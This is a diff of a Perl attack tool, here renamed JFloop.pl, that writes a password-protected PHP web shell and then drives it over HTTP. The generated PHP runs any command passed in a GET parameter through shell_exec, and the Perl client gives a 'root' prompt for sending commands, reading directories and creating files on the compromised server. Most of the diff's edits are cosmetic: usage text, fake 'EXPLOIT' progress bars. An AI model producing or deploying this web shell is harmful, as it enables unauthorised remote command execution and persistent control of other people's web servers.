@@ -1,9 +1,11 @@
+#use strict;
 use HTTP::Request;
 use LWP::UserAgent;
 use Getopt::Long;
 use Digest::MD5 qw(md5_hex);
 use Term::ReadKey;
 use Term::ANSIColor;
+use Time::HiRes qw(usleep);
 
 system("clear");
 
@@ -64,10 +66,10 @@ t
 		print colored("\t\t\t     KSJ-Killer System JoHN\n\n","bold blue"); 
 
 $go="		
-		use: nmuc.pl --conn|-c  -connect to shell
-                use: nmuc.pl --make|-m  -generate shell
-                use: nmuc.pl --help|-h  -get help
-                use: nmuc.pl --url |-u  -DNS or URL target(opcional)\n\n";
+		use: JFloop.pl --conn|-c  -connect to shell
+                use: JFloop.pl --make|-m  -generate shell
+                use: JFloop.pl --help|-h  -get help
+                use: JFloop.pl --url |-u  -DNS or URL target(opcional)\n\n";
 
 my $woner = 0;
 my $u="";
@@ -92,16 +94,20 @@ GetOptions(
 
 unless($h){
 }else{
+if($woner>0){
 print colored($help,"reset");
+}else{
+print colored($go,"reset");
+}
 exit;
 }
 
 unless($op_network){
 	unless($op_make){
 		print color("red");
-		print $go;
-		print color("bold"); 
-		print "\n\n\t\t[-] SELECT A OPTION\n\n";exit;
+		#print $go;
+		print color("red"); 
+		print "\t\t\t[-] use: JFloop.pl --help\n\n";exit;
 	}
 }else{
 	unless($op_make){
@@ -114,8 +120,11 @@ unless($op_network){
 }
 unless($op_make){
 }else{
-print color("blue");
-print "\n[*] MAKING A SHELL CODE...\n";
+print color("bold blue");
+print "-===================-\n";
+print " MAKING A SHELL CODE\n";
+print "-===================-\n";
+print "\n";
 print color("reset");
 #exit;
 }
@@ -162,7 +171,7 @@ print "[+] [MD5]PASSWORD=> $p\n";
 print color("reset");
 print "\n\n";
 print color("blue");
-print "[*] MAKING PHP CODE\n";
+print "[*] CREATING PHP CODE\n";
 print color("reset");
 
 my $ex_password=chr(36)."password";
@@ -193,6 +202,8 @@ $mmh="
 $ex_password='$p';
 $ex_code='$code';
 
+#chmod($file,777);
+
 if(!isset($ex_GET $er_e 'p' $er_ee )){exit;}$ex_p=$ex_GET $er_e 'p' $er_ee ;
 if(!isset($ex_GET $er_e 'code' $er_ee )){exit;}$ex_code_=$ex_GET $er_e 'code' $er_ee ;
 if($ex_code_!=$ex_code){exit;}
@@ -220,7 +231,7 @@ CMD_();
 
 function CMD_(){
 if(!isset($ex_GET $er_e 'cmd' $er_ee )){exit;}$ex_cmd=$ex_GET $er_e 'cmd' $er_ee ;
-echo system($ex_cmd);
+echo shell_exec($ex_cmd);
 }
 
 function EDIT_(){
@@ -262,26 +273,52 @@ print_r($ex_dir);
 ?>
 ";
 print color("blue");
-print "[*] MAKING FILE...\n";
+print "[*] MAKING PHP FILE...\n";
+#print "[+] ".$file."\n";
+print color("reset");
+
+print color("blue");
+print "[*] SETTING PHP CODE...\n";
 print color("reset");
 
 open($a,">",$file);
 $a->print($mmh);
 $a->close();
 
+print "[+] ".$file."\n";
 print color("bold green");
 print "[+] FILE $file SAVED\n\n";
 print color("reset");
 #sleep(1);
-print "CONNECTING\n";sleep(1);
-print "CONNECTING.\n";sleep(1);
-print "CONNECTING..\n";sleep(1);
-print "CONNECTING...\n";sleep(1);
+#print "CONNECTING\n";sleep(1);
+#print "CONNECTING.\n";sleep(1);
+#print "CONNECTING..\n";sleep(1);
 
-print "SETTING\n";sleep(1);
-print "SETTING.\n";sleep(1);
-print "SETTING..\n";sleep(1);
-print "SETTING...\n";sleep(1);
+my @n = 1 .. 10;
+local $| = 1;
+print colored("SETTING...    ","bold");
+print "[";
+foreach my $c (@n){
+#print("\b" x length($porcentage));
+#my $porcentage = $c * 10;
+print("=====" x length($c));
+#Time::HiRes->usleep(100000);
+usleep(100000);
+}
+print "]\n";
+
+my @n = 1 .. 10;
+local $| = 1;
+print colored("CONNECTING... ","bold");
+print "[";
+foreach my $c (@n){
+#print("\b" x length($porcentage));
+#my $porcentage = $c * 10;
+print("=====" x length($c));
+#Time::HiRes->usleep(100000);
+usleep(100000);
+}
+print "]\n";
 
 #system("perl nmuc.pl --conn");
 print "\n\n";
@@ -316,7 +353,7 @@ $response=$ua->request($re);
 if($response->status_line!=$OK_HTTP){
 print color("bold red");
 print "\n[-] ERRO\n";
-print $response->status_line;
+print $response->status_line."\n";
 print color("reset");
 exit;
 }
@@ -339,12 +376,13 @@ exit;
 
 $p=md5_hex($p);
 
-print color("bold green");
 print "\n\n";
+print color("blue");
 print "[*] OWNER\n";
+print color("bold green");
 print "[+] URL=> $u\n";
 print "[+] PASSWORD=> $p\n";
-print color("reset");
+#print color("reset");
 
 if($u!~m/[?]/){
 $u=$u."?";
@@ -353,9 +391,9 @@ $u=$u."?";
 my $ioe="code=".$code."&p=".$p;
 $auth=$u.$ioe;
 
-print color("blue");
-print "[*] AUTHENTICATON...\n";
-print color("reset");
+#print color("blue");
+print "[+] AUTHENTICATON...\n";
+#print color("reset");
 
 if($re=HTTP::Request->new(GET=>$auth)){
 $response=$ua->request($re);
@@ -363,7 +401,9 @@ if($response->status_line==$OK_HTTP){
 $htm=$response->decoded_content;
 if($htm!~m/$RE_ERRO/){
 print color("bold blue");
-print "[+] OK WELCOME\n";
+print "[!] OK WELCOME\n";
+print "\n";
+$woner=1;
 print color("reset");
 }else{
 print color("bold red");
@@ -414,6 +454,27 @@ if($command eq "create"){
 EDIT_();
 }
 if($command eq "cmd"){
+my @n = 1 .. 10;
+local $| = 1;
+print colored("EXPLOIT... ","bold");
+print "[";
+foreach my $c (@n){
+#print("\b" x length($porcentage));
+#my $porcentage = $c * 10;
+print("=====" x length($c));
+#Time::HiRes->usleep(100000);
+usleep(100000);
+}
+print "]\n";
+foreach my $p (@n){
+#print("\b" x length($porcentage));
+my $pc = $p * 10;
+print "$pc";
+sleep(1);
+print("\b" x length($pc));
+}
+print colored("[*] SUCCESS","blue");
+print "\n\n";
 CMD_();
 }
 if($command eq "help"){
@@ -425,12 +486,14 @@ if($command ne "ls" || $command ne "clear" || $command ne "exit" || $command ne 
 
 sub CMD_(){
 
+print "(cmd)"; 
+print colored("root","red");
 print ">";
 $cmd=<STDIN>;
 chomp($cmd);
 
 $gh=$auth."&type=cmd&cmd=".$cmd;
-print $gh;
+#print $gh;
 if($re=HTTP::Request->new(GET=>$gh)){
 $response=$ua->request($re);
 if($response->status_line==$OK_HTTP){
@@ -606,13 +669,10 @@ if($re=HTTP::Request->new(GET=>$uumk_)){
 $response=$ua->request($re);
 if($response->status_line==$OK_HTTP){
 $htm=$response->decoded_content;
+print $html;
 if($htm!~m/$RE_ERRO/){
 print "\n";
-
-
 print "\n[+] FOLDER $folder CREATED\n";
-
-
 }else{
 print "[-] INCORRECT PASSWORD\n";
 exit;
